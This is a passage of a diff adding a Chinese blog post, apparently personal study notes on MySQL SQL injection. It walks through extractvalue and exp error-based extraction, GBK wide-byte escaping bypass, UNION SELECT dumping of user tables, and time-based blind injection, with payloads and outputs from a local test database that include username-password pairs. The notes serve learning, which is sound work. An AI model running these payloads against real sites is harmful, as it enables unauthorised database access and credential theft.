<span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;Host&#x27;</span>,<span class="string">&#x27;User&#x27;</span>,<span class="string">&#x27;Select_priv&#x27;</span>)),<span class="string">&#x27;&lt;&#x27;</span>));</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;&gt;image_id,image_user_name,image_&#x27;</span></span><br><span class="line">由于ExtractValue也是一次只能查询<span class="number">32</span>位长度的数据,所以当我们获得数据后可以用`<span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)`来过滤掉已知数据</span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;123&lt;/b&gt;&lt;/a&gt;&#x27;</span>,concat(<span class="string">&#x27;&gt;&#x27;</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;image_upload&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;&lt;&#x27;</span>));</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;&gt;image_id&lt;&#x27;</span></span><br><span class="line">我们也可以通过limit()而不使用concat(),来获取指定行的数据</span><br><span class="line"><span class="comment">-----------------------------------------</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;123&lt;/b&gt;&lt;/a&gt;&#x27;</span>,concat(<span class="string">&#x27;&gt;&#x27;</span>,(<span class="keyword">select</span> group_concat(image_id,image_user_name) <span class="keyword">from</span> users.image_upload <span class="keyword">where</span> image_id <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;37&#x27;</span>)),<span class="string">&#x27;&lt;&#x27;</span>));</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;&gt;36胡桃,35猫猫,34猫猫,38&#x27;</span></span><br><span class="line">由于concat只能拼接一列数据,所以当我们想要同时获取多组数据时我们可以用group_concat()将获取到的数据拼接为一个字符串,从而令concat()可以正常识别</span><br></pre></td></tr></table></figure>
+
+<h5 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">取整函数,</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">floor</span>(<span class="number">114.514</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(<span class="number">114.514</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">114</span> <span class="operator">|</span> </span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exp</span>(x);会返回自然对数e的x次方,</span><br><span class="line">但当x<span class="operator">&gt;=</span><span class="number">710</span>时,返回的数字会超过MySQL能处理的最大值,因此会报错(版本<span class="operator">&gt;</span><span class="number">5.5</span>时才输出报错)</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="number">709</span><span class="operator">+</span>C<span class="comment">/*C为我们传入的数字*/</span><span class="operator">-</span>(ascii(<span class="string">&#x27;a&#x27;</span>)));</span><br><span class="line">a的ASCII编码为<span class="number">97</span>,当我们传入<span class="number">98</span>时,exp中的数字为<span class="number">710</span>,会报错,传入<span class="number">97</span>时exp中的数字为<span class="number">709</span>,恰好不报错,当我们传入的数字从报错变为恰好不报错时,不报错的数字便是目标字符串的ascii编码</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> if((<span class="built_in">exp</span>(<span class="number">709</span><span class="operator">+</span><span class="number">97</span><span class="operator">-</span>(ascii(<span class="string">&#x27;a&#x27;</span>)))),<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> if((<span class="built_in">exp</span>(<span class="number">709</span><span class="operator">+</span><span class="number">97</span><span class="operator">-</span>(ascii(<span class="string">&#x27;a&#x27;</span>)))),<span class="number">1</span>,<span class="number">0</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> if((<span class="built_in">exp</span>(<span class="number">709</span><span class="operator">+</span><span class="number">98</span><span class="operator">-</span>(ascii(<span class="string">&#x27;a&#x27;</span>)))),<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;exp(((709 + 98) - ascii(&#x27;</span>a<span class="string">&#x27;)))&#x27;</span></span><br><span class="line"><span class="comment">--------------------------------------------------------</span></span><br><span class="line">我们也可以结合substr()和if()等函数进行盲注</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> if(<span class="built_in">exp</span>(<span class="number">709</span><span class="operator">+</span><span class="number">117</span><span class="operator">-</span>ascii((substr(database(),<span class="number">1</span>,<span class="number">1</span>)))),<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> if(<span class="built_in">exp</span>(<span class="number">709</span><span class="operator">+</span><span class="number">117</span><span class="operator">-</span>ascii((substr(database(),<span class="number">1</span>,<span class="number">1</span>)))),<span class="number">1</span>,<span class="number">0</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>后端与mysql编码不同</p>
+<h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ASCII编码: a <span class="operator">-</span><span class="operator">&gt;</span> <span class="number">1</span>b <span class="operator">-</span><span class="operator">&gt;</span> 一个字节 <span class="operator">-</span><span class="operator">&gt;</span> <span class="number">0x61</span> 不支持中文</span><br><span class="line">gbk<span class="comment">--gb2312编码: 支持中文,一个中文占两个字节  0xbaba -&gt; 汉</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> concat(<span class="type">char</span>(<span class="number">0xbaba</span> <span class="keyword">using</span> gbk)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> 汉                             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line">utf<span class="number">-8</span>编码: 可变长度的编码方式,一中文占三字节 <span class="number">0xe6b189</span> <span class="operator">-</span><span class="operator">&gt;</span> 汉</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+</span></span><br><span class="line"><span class="operator">|</span> concat(<span class="type">char</span>(<span class="number">0xE6B189</span> <span class="keyword">using</span> utf8)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+</span></span><br><span class="line"><span class="operator">|</span> 汉                                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+</span></span><br><span class="line">Unicode编码:万国码,啥都有  每个字符<span class="number">4</span>字节</span><br></pre></td></tr></table></figure>
+
+<h4 id="GBK"><a href="#GBK" class="headerlink" title="(GBK)"></a>(GBK)</h4><p>当前端对我们的字符进行url编码并发送到后端时,后端对我们输入的字符进行<code>\</code>转义,</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg:输入`<span class="number">1</span><span class="string">&#x27; or 1=1 #`被转义为`1%5C%27+or+1%3D1+%23`</span></span><br></pre></td></tr></table></figure>
+
+<p>后端会将转移后的数据发送到数据库,如果我们在<code>\</code>前加一个编码<code>%df</code>这样的话,当后端将加上<code>%df</code>后的编码发送到数据库进行操作时,若数据库为gb2312编码,那么数据库会将前两个编码识别为一个字符<code>運</code>,这样一来,转义的字符就会被吞掉从而实现绕过,进而注入成功</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg`<span class="number">1</span><span class="operator">%</span>df\<span class="string">&#x27;or 1=1 #`发送到后端时为`1%df5C%27+or+1%3D1+%23`,这样到数据库执行时就变为了`1運&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #`从而绕过</span><br></pre></td></tr></table></figure>
+
+<p>具体流程</p>
+<table>
+<thead>
+<tr>
+<th align="center">用户输入</th>
+<th align="center">&#x3D;&#x3D;&gt;</th>
+<th align="center">过滤函数</th>
+<th align="center">&#x3D;&#x3D;&gt;</th>
+<th align="center">代码层的 $sql</th>
+<th align="center">&#x3D;&#x3D;&gt;</th>
+<th align="center">MySQL 处理请求</th>
+<th align="center">&#x3D;&#x3D;&gt;</th>
+<th align="center">MySQL 结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">%df%27</td>
+<td align="center">&#x3D;&#x3D;&gt;</td>
+<td align="center">addslashes</td>
+<td align="center">&#x3D;&#x3D;&gt;</td>
+<td align="center">%df%5c%27</td>
+<td align="center">&#x3D;&#x3D;&gt;</td>
+<td align="center">(GBK)</td>
+<td align="center">&#x3D;&#x3D;&gt;</td>
+<td align="center">運</td>
+</tr>
+</tbody></table>
+<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><h4 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h4><p>是搜索功能点</p>
+<h4 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">联合注入主要使用`<span class="keyword">union</span> <span class="keyword">select</span>`方法联合查询数据库的内容</span><br><span class="line">eg:<span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;$name&#x27;</span></span><br><span class="line">将设当前有一个这样的<span class="keyword">sql</span>语句,$name可控,我们可以传入`<span class="number">1</span><span class="string">&#x27; union select username,password form users.users;`</span></span><br><span class="line"><span class="string">=============================================</span></span><br><span class="line"><span class="string">mysql&gt; select time,password_time from users where username = &#x27;</span>admin<span class="string">&#x27; union select username,password from users.users;</span></span><br><span class="line"><span class="string">+---------------------+---------------------+</span></span><br><span class="line"><span class="string">| time                | password_time       |</span></span><br><span class="line"><span class="string">+---------------------+---------------------+</span></span><br><span class="line"><span class="string">| 2024-03-11 23:22:47 | 2024-03-17 15:00:24 |</span></span><br><span class="line"><span class="string">| admin               | 123                 |</span></span><br><span class="line"><span class="string">| tou_zi              | liuhaiyang1216      |</span></span><br><span class="line"><span class="string">+---------------------+---------------------+</span></span><br><span class="line"><span class="string">当我们使用`union select`想要获取表单的内容时,我们需要先知道表单所在的数据库以及表的字段名,才可以获取表的内容,</span></span><br><span class="line"><span class="string">---------------------------------------------</span></span><br><span class="line"><span class="string">mysql&gt; select time,password_time from users where username = &#x27;</span>admin<span class="string">&#x27; union select 1,table_name from information_schema.tables where table_name = &#x27;</span>users<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">+---------------------+---------------------+</span></span><br><span class="line"><span class="string">| time                | password_time       |</span></span><br><span class="line"><span class="string">+---------------------+---------------------+</span></span><br><span class="line"><span class="string">| 2024-03-11 23:22:47 | 2024-03-17 15:00:24 |</span></span><br><span class="line"><span class="string">| 1                   | users               |</span></span><br><span class="line"><span class="string">+---------------------+---------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql&gt; select time,password_time from users where username = &#x27;</span>admin<span class="string">&#x27; union select 1,column_name from information_schema.</span></span><br><span class="line"><span class="string">columns where table_name = &#x27;</span>users<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">+---------------------+---------------------+</span></span><br><span class="line"><span class="string">| time                | password_time       |</span></span><br><span class="line"><span class="string">+---------------------+---------------------+</span></span><br><span class="line"><span class="string">| 2024-03-11 23:22:47 | 2024-03-17 15:00:24 |</span></span><br><span class="line"><span class="string">| 1                   | username            |</span></span><br><span class="line"><span class="string">| 1                   | password            |</span></span><br><span class="line"><span class="string">| 1                   | USER                |</span></span><br><span class="line"><span class="string">| 1                   | CURRENT_CONNECTIONS |</span></span><br><span class="line"><span class="string">| 1                   | TOTAL_CONNECTIONS   |</span></span><br><span class="line"><span class="string">| 1                   | ID                  |</span></span><br><span class="line"><span class="string">| 1                   | time                |</span></span><br><span class="line"><span class="string">| 1                   | password_time       |</span></span><br><span class="line"><span class="string">+---------------------+---------------------+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h4 id="函数"><a href="#函数" class="headerlink" title="函数:"></a>函数:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(<span class="operator">&lt;</span>判断<span class="operator">&gt;</span>,<span class="operator">&lt;</span>真时执行<span class="operator">&gt;</span>,<span class="operator">&lt;</span>假时执行<span class="operator">&gt;</span>)</span><br><span class="line">sleep(<span class="operator">&lt;</span><span class="type">time</span><span class="operator">&gt;</span>)</span><br><span class="line">substr(<span class="operator">&lt;</span>字符串<span class="operator">&gt;</span>,<span class="operator">&lt;</span>开始位置<span class="operator">&gt;</span>,<span class="operator">&lt;</span>截取数量<span class="operator">&gt;</span>)</span><br><span class="line">TO_BASE64() 和 FROM_BASE64()</span><br></pre></td></tr></table></figure>
+
+<h4 id="boolian型-布尔-时间型"><a href="#boolian型-布尔-时间型" class="headerlink" title="boolian型(布尔)&amp;时间型"></a>boolian型(布尔)&amp;时间型</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">我们可以利用if()函数来执行sleep(),观察响应时间进而判断注入知否成功,同时调用substr()函数,来对database,<span class="keyword">table</span>,<span class="keyword">column</span>进行爆破</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;u&#x27;</span>,sleep(<span class="number">2</span>),<span class="string">&#x27;N000&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;u&#x27;</span>,sleep(<span class="number">2</span>),<span class="string">&#x27;a&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0</span>                                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">2.00</span> sec)</span><br><span class="line"></span><br><span class="line">获取当前数据库</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="type">char</span>(<span class="number">0x75</span> <span class="keyword">using</span> utf8),sleep(<span class="number">2</span>),<span class="string">&#x27;N000&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="type">char</span>(<span class="number">0x75</span> <span class="keyword">using</span> utf8),sleep(<span class="number">2</span>),<span class="string">&#x27;a&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0</span>                                                             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">2.01</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> username <span class="keyword">from</span> `users` <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="type">char</span>(<span class="number">0x75</span> <span class="keyword">using</span> utf8),sleep(<span class="number">2</span>),<span class="string">&#x27;N000&#x27;</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">4.01</span> sec)</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">获取指定数据库内的表名，由于一个库内大概率会存在多个表，所以我们可以使用group_concat()函数来将其合并为一行字符串，同时我们也可用group_concat()中的SEPARATOR功能来指定分隔符来判断表的结尾，`group_concat(table_name SEPARATOR <span class="string">&#x27;|&#x27;</span>)`</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line"><span class="operator">|</span> table_name   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line"><span class="operator">|</span> image_upload <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> users        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">------------------------------------------------------------</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(table_name SEPARATOR <span class="string">&#x27;|&#x27;</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(table_name SEPARATOR <span class="string">&#x27;|&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> image_upload<span class="operator">|</span>users                     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">------------------------------------------------------------</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> if(substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;i&#x27;</span>,sleep(<span class="number">2</span>),<span class="string">&#x27;N000&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------</span></span><br><span class="line"><span class="comment">-----------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> if(substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;i&#x27;</span>,sleep(<span class="number">2</span>),<span class="string">&#x27;N000&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------</span></span><br><span class="line"><span class="comment">-----------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0</span>                     <span class="operator">|</span>                                                                                   </span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------</span></span><br><span class="line"><span class="comment">-----------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>宝，真的不考虑给点赏钱吗？</div>
+  <button>
+    赏了!
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="坠入极夜的夏 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.jpg" alt="坠入极夜的夏 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>坠入极夜的夏
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2024/12/07/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" title="24-11-22-sql注入学习">http://example.com/2024/12/07/sql注入基础/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/09/26/24-9-24-web%E7%88%86%E7%A0%B4-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="prev" title="24-9-24-web爆破-学习笔记">
+                  <i class="fa fa-angle-left"></i> 24-9-24-web爆破-学习笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">坠入极夜的夏</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
